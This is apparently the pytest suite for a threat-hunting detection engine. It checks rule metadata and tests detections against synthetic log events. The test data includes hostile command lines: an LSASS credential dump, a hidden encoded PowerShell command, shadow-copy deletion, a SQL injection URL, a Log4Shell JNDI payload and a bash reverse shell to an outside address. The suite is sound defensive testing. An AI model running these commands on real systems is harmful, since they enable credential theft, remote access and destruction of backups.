"""Rule library integrity and detection behaviour."""

from __future__ import annotations

import pytest

from app.engine.catalog import DATA_SOURCES, HYPOTHESES, get_hypothesis, validate_catalogue
from app.engine.event import Event
from app.engine.executor import DetectionEngine, HuntContext
from app.engine.parsers import enrich
from app.engine.rules import ALL_RULES, RULES_BY_ID, rules_for, statistics
from app.engine.rules.base import PatternRule, SequenceRule, StatisticalRule, ThresholdRule

VALID_SEVERITIES = {"critical", "high", "medium", "low", "info"}
VALID_CONFIDENCE = {"high", "medium", "low"}


def make_event(raw="", timestamp=None, source="generic", **fields):
    event = Event(raw=raw or " ".join(str(value) for value in fields.values()),
                  source_file="test.log", line_no=1, data_source=source, timestamp=timestamp)
    for key, value in fields.items():
        event.set(key.replace("__", "."), value)
    return enrich(event)


def run(rule_ids, events):
    context = HuntContext(events=events)
    engine = DetectionEngine(rules_for(rule_ids))
    return engine.run(context)


class TestLibraryIntegrity:
    def test_identifiers_are_unique(self):
        assert len(RULES_BY_ID) == len(ALL_RULES)

    def test_library_is_substantial(self):
        stats = statistics()
        assert stats["total"] >= 100
        assert stats["mitre_techniques"] >= 60
        assert set(stats["by_type"]) == {"pattern", "threshold", "sequence", "statistical"}

    @pytest.mark.parametrize("rule", ALL_RULES, ids=[rule.id for rule in ALL_RULES])
    def test_every_rule_is_reportable(self, rule):
        assert rule.severity in VALID_SEVERITIES
        assert rule.confidence in VALID_CONFIDENCE
        assert len(rule.name) > 10
        assert len(rule.description) > 60
        assert len(rule.risk) > 40, "every rule must state the cyber risk"
        assert len(rule.impact) > 40, "every rule must state the cyber impact"
        assert len(rule.recommendation) > 60, "every rule must carry a recommendation"
        assert rule.mitre_tactic and rule.mitre_technique
        assert rule.category

    @pytest.mark.parametrize("rule", ALL_RULES, ids=[rule.id for rule in ALL_RULES])
    def test_no_em_dashes_in_narrative(self, rule):
        for text in (rule.name, rule.description, rule.risk, rule.impact, rule.recommendation):
            assert "\u2014" not in text and "\u2013" not in text

    def test_single_event_rules_have_a_prefilter(self):
        for rule in ALL_RULES:
            if isinstance(rule, (PatternRule, ThresholdRule, SequenceRule)):
                assert rule.keywords or rule.event_codes or rule.data_sources, rule.id

    def test_selector_resolution(self):
        assert len(rules_for(["*"])) == len(ALL_RULES)
        assert len(rules_for(["win-lsass-credential-dump"])) == 1
        assert len(rules_for(["win-*"])) > 10
        assert rules_for(["does-not-exist"]) == []
        assert len(rules_for(["credential_access"])) > 5


class TestCatalogue:
    def test_catalogue_is_valid(self):
        assert validate_catalogue() == []

    def test_families_are_covered(self):
        families = {item.family for item in HYPOTHESES}
        assert families == {"cti", "technique", "mathematical"}

    @pytest.mark.parametrize("hypothesis", HYPOTHESES, ids=[item.id for item in HYPOTHESES])
    def test_hypothesis_is_complete(self, hypothesis):
        assert len(hypothesis.narrative) > 150
        assert len(hypothesis.rationale) > 80
        assert len(hypothesis.method) > 60
        assert hypothesis.expected_findings
        assert hypothesis.rules()
        for source in hypothesis.required_data_sources:
            assert source in DATA_SOURCES

    def test_full_spectrum_runs_everything(self):
        assert len(get_hypothesis("math-full-spectrum").rules()) == len(ALL_RULES)

    def test_serialisation_contains_the_data_sources(self):
        payload = get_hypothesis("cti-ransomware-precursor").to_dict()
        ids = [source["id"] for source in payload["required_data_sources"]]
        assert "windows_security" in ids
        assert payload["rule_count"] > 5
        assert payload["techniques"]


class TestPatternDetections:
    def test_lsass_dumping(self):
        events = [make_event(source="sysmon", process__command_line=
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 748 C:\\Users\\Public\\lsass.dmp full",
            host__name="WS01")]
        findings = run(["win-lsass-credential-dump"], events)
        assert len(findings) == 1
        assert findings[0].severity == "critical"
        assert findings[0].evidence

    def test_encoded_powershell(self):
        events = [make_event(source="sysmon", host__name="WS01", process__command_line=
            "powershell.exe -nop -w hidden -enc " + "A" * 60)]
        assert run(["win-encoded-powershell"], events)

    def test_benign_powershell_is_not_flagged(self):
        events = [make_event(source="sysmon", host__name="WS01",
                             process__command_line="powershell.exe -File C:\\Scripts\\Report.ps1")]
        assert run(["win-encoded-powershell"], events) == []

    def test_office_spawning_a_shell(self):
        events = [make_event(source="sysmon", host__name="WS01",
                             process__parent__executable="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                             process__executable="C:\\Windows\\System32\\cmd.exe",
                             process__command_line="cmd.exe /c calc")]
        findings = run(["win-office-spawns-shell"], events)
        assert findings and findings[0].mitre_technique_id == "T1566.001"

    def test_explorer_spawning_a_shell_is_not_flagged(self):
        events = [make_event(source="sysmon", host__name="WS01",
                             process__parent__executable="C:\\Windows\\explorer.exe",
                             process__executable="C:\\Windows\\System32\\cmd.exe")]
        assert run(["win-office-spawns-shell"], events) == []

    def test_shadow_copy_deletion(self):
        events = [make_event(source="sysmon", host__name="SRV01",
                             process__command_line="vssadmin.exe delete shadows /all /quiet")]
        findings = run(["win-shadow-copy-deletion"], events)
        assert findings and findings[0].mitre_technique_id == "T1490"

    def test_sql_injection_in_a_web_request(self):
        events = [make_event(source="web", source__ip="203.0.113.5",
                             url__original="/api?id=1%27+UNION+SELECT+password+FROM+users--",
                             http__request__method="GET", http__response__status_code="200")]
        assert run(["web-sql-injection"], events)

    def test_normal_web_request_is_not_flagged(self):
        events = [make_event(source="web", source__ip="10.0.0.5", url__original="/api/v1/orders?page=2",
                             http__request__method="GET", http__response__status_code="200")]
        assert run(["web-sql-injection", "web-command-injection", "web-path-traversal"], events) == []

    def test_log4shell_payload(self):
        events = [make_event(source="web", source__ip="203.0.113.5",
                             user_agent__original="${jndi:ldap://evil.example.com/a}")]
        assert run(["web-log4shell"], events)

    def test_cloud_logging_disabled(self):
        events = [make_event(source="aws_cloudtrail", event__action="StopLogging",
                             user__name="ci-deploy", cloud__account__id="123456789012")]
        findings = run(["cloud-logging-disabled"], events)
        assert findings and findings[0].severity == "critical"

    def test_reverse_shell_on_linux(self):
        events = [make_event(source="linux_auth", host__name="srv-web-01",
                             process__command_line="bash -i >& /dev/tcp/185.220.101.44/4444 0>&1")]
        assert run(["nix-reverse-shell"], events)

    def test_rdp_from_a_public_address(self):
        events = [make_event(source="windows_security", event__code="4624", logon__type="10",
                             source__ip="45.155.205.87", host__name="SRV01", user__name="svc")]
        assert run(["win-rdp-external-source"], events)

    def test_rdp_from_a_private_address_is_not_flagged(self):
        events = [make_event(source="windows_security", event__code="4624", logon__type="10",
                             source__ip="10.20.4.15", host__name="SRV01", user__name="svc")]
        assert run(["win-rdp-external-source"], events) == []


class TestThresholdDetections:
    def test_failed_logon_burst(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base + index * 5, event__code="4625",
                       host__name="DC01", source__ip="45.155.205.87", user__name=f"user{index % 3}")
            for index in range(30)
        ]
        findings = run(["win-failed-logon-burst"], events)
        assert findings
        assert findings[0].metrics["peak_in_window"] >= 15

    def test_burst_below_the_threshold_is_ignored(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base + index * 5, event__code="4625",
                       host__name="DC01", source__ip="45.155.205.87", user__name="bob")
            for index in range(5)
        ]
        assert run(["win-failed-logon-burst"], events) == []

    def test_events_spread_beyond_the_window_are_ignored(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base + index * 3600, event__code="4625",
                       host__name="DC01", source__ip="45.155.205.87", user__name="bob")
            for index in range(30)
        ]
        assert run(["win-failed-logon-burst"], events) == []

    def test_password_spray_counts_distinct_accounts(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base + index * 20, event__code="4625",
                       host__name="DC01", source__ip="45.155.205.87", user__name=f"target{index}")
            for index in range(12)
        ]
        findings = run(["win-password-spray"], events)
        assert findings
        assert findings[0].metrics["distinct_values"] >= 8

    def test_spray_against_one_account_is_not_reported(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base + index * 20, event__code="4625",
                       host__name="DC01", source__ip="45.155.205.87", user__name="bob")
            for index in range(20)
        ]
        assert run(["win-password-spray"], events) == []


class TestSequenceDetections:
    def test_intrusion_chain_requires_every_stage(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base, event__code="4624",
                       host__name="SRV01", user__name="svc"),
            make_event(source="sysmon", timestamp=base + 120, host__name="SRV01",
                       process__command_line="whoami.exe /all"),
            make_event(source="sysmon", timestamp=base + 300, host__name="SRV01",
                       process__command_line="vssadmin.exe delete shadows /all"),
        ]
        findings = run(["win-intrusion-chain"], events)
        assert findings and findings[0].metrics["stage_count"] == 3

    def test_missing_stage_produces_nothing(self):
        base = 1_700_000_000
        events = [
            make_event(source="windows_security", timestamp=base, event__code="4624",
                       host__name="SRV01", user__name="svc"),
            make_event(source="sysmon", timestamp=base + 120, host__name="SRV01",
                       process__command_line="whoami.exe /all"),
        ]
        assert run(["win-intrusion-chain"], events) == []

    def test_stages_out_of_order_are_not_a_chain(self):
        base = 1_700_000_000
        events = [
            make_event(source="sysmon", timestamp=base, host__name="SRV01",
                       process__command_line="vssadmin.exe delete shadows /all"),
            make_event(source="sysmon", timestamp=base + 60, host__name="SRV01",
                       process__command_line="whoami.exe /all"),
            make_event(source="windows_security", timestamp=base + 120, event__code="4624",
                       host__name="SRV01", user__name="svc"),
        ]
        assert run(["win-intrusion-chain"], events) == []


class TestStatisticalDetections:
    def test_beaconing_is_detected(self):
        base = 1_700_000_000
        events = [
            make_event(source="network_flow", timestamp=base + index * 60,
                       source__ip="10.20.4.15", destination__ip="185.220.101.44", destination__port="8443")
            for index in range(40)
        ]
        findings = run(["stat-beaconing-fft"], events)
        assert findings
        assert findings[0].metrics["beacon_score"] > 0.8
        assert findings[0].metrics["median_interval_seconds"] == 60

    def test_irregular_traffic_is_not_beaconing(self):
        import random

        random.seed(2)
        base = 1_700_000_000
        events = [
            make_event(source="network_flow", timestamp=base + random.uniform(0, 7200),
                       source__ip="10.20.4.15", destination__ip="104.18.5.7")
            for _ in range(40)
        ]
        assert run(["stat-beaconing-fft"], events) == []

    def test_dga_domains_are_grouped_by_parent(self):
        base = 1_700_000_000
        events = [
            make_event(source="dns", timestamp=base + index * 30, source__ip="10.20.4.15",
                       dns__question__name=f"kq3v9zxlwmnbrtd{index}.tunnel.top")
            for index in range(10)
        ]
        findings = run(["stat-dga-entropy"], events)
        assert len(findings) == 1
        assert findings[0].entity == "tunnel.top"
        assert findings[0].metrics["distinct_hostnames"] == 10

    def test_ordinary_domains_are_not_flagged(self):
        base = 1_700_000_000
        events = [
            make_event(source="dns", timestamp=base + index * 30, source__ip="10.20.4.15",
                       dns__question__name=name)
            for index, name in enumerate([
                "www.microsoft.com", "login.microsoftonline.com", "api.github.com",
                "outlook.office365.com", "update.googleapis.com",
            ])
        ]
        assert run(["stat-dga-entropy"], events) == []

    def test_high_entropy_command_is_reported(self):
        payload = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA=="
        events = [make_event(source="sysmon", host__name="WS01",
                             process__command_line=f"powershell.exe -nop -w hidden -enc {payload}")]
        findings = run(["stat-command-entropy"], events)
        assert findings and findings[0].metrics["shannon_entropy"] > 3.9

    def test_rare_process_stacking(self):
        common = [
            "svchost.exe", "explorer.exe", "chrome.exe", "outlook.exe", "taskhostw.exe",
            "winword.exe", "teams.exe", "notepad.exe",
        ]
        events = [
            make_event(source="sysmon", host__name=f"WS{index % 5}",
                       process__executable=f"C:\\Windows\\System32\\{common[index % len(common)]}")
            for index in range(80)
        ]
        events.append(make_event(source="sysmon", host__name="WS1",
                                 process__executable="C:\\Users\\Public\\totally-unique-tool.exe"))
        findings = run(["stat-rare-process"], events)
        assert any("totally-unique-tool" in finding.entity for finding in findings)
        assert not any("svchost" in finding.entity for finding in findings)

    def test_authentication_spread(self):
        base = 1_700_000_000
        events = []
        for index in range(12):
            events.append(make_event(source="windows_security", timestamp=base + index * 60,
                                     event__code="4624", event__category="authentication",
                                     user__name="svc_backup", host__name=f"SRV-{index:02d}"))
        for user in ("alice", "bob", "carol", "dave"):
            events.append(make_event(source="windows_security", timestamp=base,
                                     event__code="4624", event__category="authentication",
                                     user__name=user, host__name="WS-01"))
        findings = run(["stat-auth-spread"], events)
        assert findings and findings[0].entity == "svc_backup"
        assert findings[0].metrics["distinct_systems"] == 12

    def test_small_populations_are_not_scored(self):
        events = [make_event(source="sysmon", host__name="WS01",
                             process__executable="C:\\Windows\\System32\\cmd.exe")]
        assert run(["stat-rare-process", "stat-volume-outlier", "stat-benford"], events) == []


class TestEngineBehaviour:
    def test_engine_handles_an_empty_dataset(self):
        assert DetectionEngine(list(ALL_RULES)).run(HuntContext(events=[])) == []

    def test_findings_are_ordered_by_score(self):
        events = [
            make_event(source="sysmon", host__name="WS01",
                       process__command_line="vssadmin.exe delete shadows /all"),
            make_event(source="sysmon", host__name="WS01",
                       process__command_line="whoami.exe /all"),
        ]
        findings = run(["win-shadow-copy-deletion", "win-discovery-commands"], events)
        assert [finding.severity for finding in findings] == ["critical", "medium"]

    def test_a_broken_event_does_not_stop_the_engine(self):
        broken = Event(raw="\x00 binary noise", source_file="x.log", data_source="generic")
        good = make_event(source="sysmon", host__name="WS01",
                          process__command_line="vssadmin.exe delete shadows /all")
        assert run(["win-shadow-copy-deletion"], [broken, good])
